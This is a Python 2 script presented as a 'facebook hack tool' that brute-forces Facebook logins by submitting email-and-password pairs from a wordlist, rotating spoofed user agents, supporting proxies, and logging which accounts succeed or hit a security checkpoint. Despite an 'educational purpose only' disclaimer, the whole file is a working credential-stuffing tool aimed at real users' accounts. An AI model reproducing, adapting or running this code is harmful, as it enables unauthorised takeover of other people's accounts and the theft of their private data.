# FOR EDUCATIONAL PURPOSE ONLY
#!/usr/bin/python
# This is facebook hack tools
# This was written for educational purpose and pentest only. Use it at your own risk.
# Author will not be responsible for any damage !!
# Toolname      : facebookhack.py
# Version       : 1.0
# Date          : Friday Jan  11:41:05 EST
# https://www.facebook.com/groups/anonymousddosers/
#
 
 
import re
import os
import sys
import random
import warnings
import time
try:
        import mechanize
except ImportError:
        print "[*] Please install mechanize python module first"
        sys.exit(1)
except KeyboardInterrupt:
        print "\n[*] Exiting program...\n"
        sys.exit(1)
try:
        import cookielib
except ImportError:
        print "[*] Please install cookielib python module first"
        sys.exit(1)
except KeyboardInterrupt:
        print "\n[*] Exiting program...\n"
        sys.exit(1)
 
warnings.filterwarnings(action="ignore", message=".*gzip transfer encoding is experimental!", category=UserWarning)
 
# define variable
__programmer__  = "mmmuhahaha_ <hehe.haha@gmail.com>"
__version__     = "1.0"
verbose         = False
useproxy        = False
usepassproxy    = False
log             = 'fbhacker.log'
file            = open(log, "a")
success         = 'home_edit_profile'
checkpoint      = 'checkpoint'
oldpass         = 'You entered an old password'
fblogin         = 'https://login.facebook.com/login.php?login_attempt=1'
# some cheating ..
useragent    = ['Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.10 sun4u; X11)',
                'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.2pre) Gecko/20100207 Ubuntu/9.04 (jaunty) Namoroka/3.6.2pre',
                'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser;',
                'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)',
                'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)',
                'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.6)',
                'Microsoft Internet Explorer/4.0b1 (Windows 95)',
                'Opera/8.00 (Windows NT 5.1; U; en)',
                'Mozilla/4.0 (compatible; MSIE 5.0; AOL 4.0; Windows 95; c_athome)',
                'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)',
                'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Kubuntu)',
                'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; ZoomSpider.net bot; .NET CLR 1.1.4322)',
                'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; QihooBot 1.0 qihoobot@qihoo.net)',
                'Mozilla/4.0 (compatible; MSIE 5.0; Windows ME) Opera 5.11 [en]'
                ]
facebook        = '''
__               _                 _
/ _|             | |               | |
| |_ __ _  ___ ___| |__   ___   ___ | | __
|  _/ _` |/ __/ _ \ '_ \ / _ \ / _ \| |/ /
| || (_| | (_|  __/ |_) | (_) | (_) |   <
|_| \__,_|\___\___|_.__/ \___/ \___/|_|\_\\
                                      bruteforcer...
 
Programmer : %s
Version    : %s''' % (__programmer__, __version__)
option          = '''
Usage  : %s [options]
Option : -w, --wordlist         <filename>      |   Wordlist used for bruteforcing
       -v, --verbose                          |   Set %s will be verbose
       -p, --proxy            <host:port>     |   Set http proxy will be use
       -k, --usernameproxy    <username>      |   Set username at proxy will be use
       -i, --passproxy        <password>      |   Set password at proxy will be use
       -l, --log              <filename>      |   Specify output filename (default : fbbruteforcer.log)
       -h, --help             <help>          |   Print this help
 
Example : %s -w wordlist.txt"
 
P.S : add "&" to run in the background
''' % (sys.argv[0], sys.argv[0], sys.argv[0])
hme             = '''
Usage : %s [option]
      -h or --help for get help
      ''' % sys.argv[0]
 
def helpme():
        print facebook
        print option
        file.write(facebook)
        file.write(option)
        sys.exit(1)
 
def helpmee():
        print facebook
        print hme
        file.write(facebook)
        file.write(hme)
        sys.exit(1)
 
for arg in sys.argv:
        try:
                if arg.lower() == '-u' or arg.lower() == '--user':
                        username = sys.argv[int(sys.argv[1:].index(arg))+2]
                elif arg.lower() == '-w' or arg.lower() == '--wordlist':
                        wordlist = sys.argv[int(sys.argv[1:].index(arg))+2]
                elif arg.lower() == '-l' or arg.lower() == '--log':
                        log = sys.argv[int(sys.argv[1:].index(arg))+2]
                elif arg.lower() == '-p' or arg.lower() == '--proxy':
                        useproxy = True
                        proxy = sys.argv[int(sys.argv[1:].index(arg))+2]
                elif arg.lower() == '-k' or arg.lower() == '--userproxy':
                        usepassproxy = True
                        usw = sys.argv[int(sys.argv[1:].index(arg))+2]
                elif arg.lower() == '-i' or arg.lower() == '--passproxy':
                        usepassproxy = True
                        usp = sys.argv[int(sys.argv[1:].index(arg))+2]
                elif arg.lower() == '-v' or arg.lower() == '--verbose':
                        verbose = True
                elif arg.lower() == '-h' or arg.lower() == '--help':
                        helpme()
                elif len(sys.argv) <= 1:
                        helpmee()
        except IOError:
                helpme()
        except NameError:
                helpme()
        except IndexError:
                helpme()
 
def bruteforce(word):
        try:
                pos = word.find("::")
                userEmail = word[0:pos]
                word = word[pos+len("::"):len(word)]
               
                print("userEmail: " + userEmail )
                print("password: " + word )
                file.write("[*] Trying " + userEmail + "::" + word + "\n" )
                sys.stdout.flush()
                rch = random.choice(useragent)
                br.addheaders = [('User-agent', rch)]
                # print("User Agent: " + rch )
                opensite = br.open(fblogin)
 
                # To show and print all forms name
                # for form in br.forms():
                #      print "Form name:", form.name
                #      print form
 
                # To show all control elements in the form
                # br.form = list(br.forms())[0]
                # for control in br.form.controls:
                #      print control
                #      print "type=%s, name=%s value=%s" % (control.type, control.name, br[control.name])
 
                # To dump cookies data being sent and received
                # dump();
 
                # Release email account from autotext fill
                # If email still auto-filled on login form, this script would not work as expected, so we need to release it
 
                NotMe = "notme_cuid"
                for link in br.links():
                        if (NotMe in link.url):
                                request = br.click_link(link)
                                response = br.follow_link(link)
                                # print response.geturl()
 
                br.select_form(nr=0)
 
                br.form = list(br.forms())[0]
                br.form['email'] = userEmail
                br.form['pass'] = word
                br.submit()
                response = br.response().read()
 
                if verbose:
                        print response
                if success in response:
                        print "\n\n[*] Logging in success..."
                        print "[*] userEmail : %s" % (userEmail)
                        print "[*] Password : %s\n" % (word)
                        file.write("\n[*] Logging in success...")
                        file.write("\n[*] userEmail : %s" % (userEmail))
                        file.write("\n[*] Password : %s\n\n" % (word))
 
                        # After successful login, force to Log Out (to clear the cookies & session - important!)
                        for form in br.forms():
                                if form.attrs['id'] == 'logout_form':
                                        br.form = form
                                        br.submit()
                elif checkpoint in response:
                        print "\n\n[*] Logging in success...but stuck on checkpoint! Victim maybey has been noticed"
                        print "[*] userEmail : %s" % (userEmail)
                        print "[*] Password : %s\n" % (word)
                        file.write("\n[*] Logging in success...but stuck on checkpoint! Victim maybey has been noticed")
                        file.write("\n[*] userEmail : %s" % (userEmail))
                        file.write("\n[*] Password : %s\n\n" % (word))
 
                        # In checkpoint, this account may has been logged in, so we need to Log it Out after successful login
                        LogOut = "logout.php"
                        for link in br.links():
                                if (LogOut in link.url):
                                        request = br.click_link(link)
                                        response = br.follow_link(link)
                                        # print response.geturl()
                                        # print "This account has been logged out"
                                # else:
                                #        print "Can not click Log Out link"
                       
        except KeyboardInterrupt:
                print "\n[*] Exiting program...\n"
                sys.exit(1)
        except mechanize._mechanize.FormNotFoundError:
                print "\n[*] Form Not Found\n"
                file.write("\n[*] Form Not Found\n")
                sys.exit(1)
        except mechanize._form.ControlNotFoundError:
                print "\n[*] Control Not Found\n"
                file.write("\n[*] Control Not Found\n")
                sys.exit(1)
 
# Function to Dump Cookies Data
# def dump():
#       for cookie in cj:
#               print cookie.name, cookie.value
 
def releaser():
        global word
        for word in words:
                bruteforce(word.replace("\n",""))
 
def main():
        global br
        global words
        # Uncomment this variable if you want to enable dump()
        # global cj
        try:
                br = mechanize.Browser()
                cj = cookielib.LWPCookieJar()
                br.set_cookiejar(cj)
                br.set_handle_equiv(True)
                br.set_handle_gzip(True)
                br.set_handle_redirect(True)
                br.set_handle_referer(True)
                br.set_handle_robots(False)
                br.set_debug_http(False)
                br.set_debug_redirects(False)
                br.set_debug_redirects(False)
                br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
                if useproxy:
                        br.set_proxies({"http": proxy})
                if usepassproxy:
                        br.add_proxy_password(usw, usp)
                if verbose:
                        br.set_debug_http(True)
                        br.set_debug_redirects(True)
                        br.set_debug_redirects(True)
        except KeyboardInterrupt:
                print "\n[*] Exiting program...\n"
                file.write("\n[*] Exiting program...\n")
                sys.exit(1)
        try:
                preventstrokes = open(wordlist, "r")
                words          = preventstrokes.readlines()
                count          = 0
                while count < len(words):
                        words[count] = words[count].strip()
                        count += 1
        except IOError:
                print "\n[*] Error: Check your wordlist path\n"
                file.write("\n[*] Error: Check your wordlist path\n")
                sys.exit(1)
        except NameError:
                helpme()
        except KeyboardInterrupt:
                print "\n[*] Exiting program...\n"
                file.write("\n[*] Exiting program...\n")
                sys.exit(1)
        try:
                print facebook
                print "\n[*] Starting attack at %s" % time.strftime("%X")
                #print "[*] Account for bruteforcing %s" % (username)
                print "[*] Loaded :",len(words),"words"
                print "[*] Bruteforcing, please wait..."
                file.write(facebook)
                file.write("\n[*] Starting attack at %s" % time.strftime("%X"))
                #file.write("\n[*] Account for bruteforcing %s" % (username))
                file.write("\n[*] Loaded : %d words" % int(len(words)))
                file.write("\n[*] Bruteforcing, please wait...\n")
        except KeyboardInterrupt:
                print "\n[*] Exiting program...\n"
                sys.exit(1)
        try:
                releaser()
                bruteforce(word)
        except NameError:
                helpme()
 
if __name__ == '__main__':
        main()